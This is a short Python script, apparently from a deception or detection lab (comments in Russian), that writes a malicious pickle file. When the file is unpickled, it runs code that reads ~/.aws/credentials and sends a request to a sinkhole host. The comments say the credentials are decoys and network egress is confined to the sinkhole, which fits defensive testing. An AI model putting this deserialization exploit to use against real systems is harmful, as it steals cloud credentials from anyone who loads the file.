import pickle

# Демонстрация Этапа 1: читает подставные креды (HOME=/deception) и «утекает» данные
# на sinkhole. В кластере egress разрешён только к sinkhole (см. NetworkPolicy),
# поэтому обращение фиксируется и в audit-hook'ах, и в логах sinkhole.
CODE = (
    "import os, urllib.request\n"
    "try:\n"
    "    data = open(os.path.expanduser('~/.aws/credentials')).read()\n"
    "except Exception:\n"
    "    data = ''\n"
    "urllib.request.urlopen('http://sinkhole:8080/exfil-canary?stolen=' + str(len(data)))\n"
)


class Exfil:
    def __reduce__(self):
        return (exec, (CODE,))


if __name__ == "__main__":
    with open("./evil6.pkl", "wb") as f:
        f.write(pickle.dumps(Exfil()))
    print("[+] evil6.pkl сгенерирован (deception + sinkhole)")
